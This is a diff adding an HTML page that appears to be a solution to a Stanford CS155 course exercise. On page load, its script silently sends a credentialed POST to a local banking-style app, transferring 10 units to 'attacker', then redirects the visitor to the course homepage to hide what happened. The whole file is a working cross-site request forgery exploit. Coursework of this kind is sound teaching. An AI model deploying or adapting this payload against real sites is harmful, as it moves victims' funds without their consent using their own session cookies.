@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+
+<script type="text/javascript">
+    window.onload = function() {
+        // 使用fetch API发送数据
+        fetch('http://localhost:3000/post_transfer', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'destination_username=attacker&quantity=10',
+            credentials: 'include'
+        })
+        .then(response => {
+            window.location.href = "https://cs155.stanford.edu/";
+        })
+        .catch(error => {
+            console.error('There has been a problem with your fetch operation:', error);
+            window.location.href = "https://cs155.stanford.edu/";
+        });
+    };
+</script>
+
+</body>
+</html>
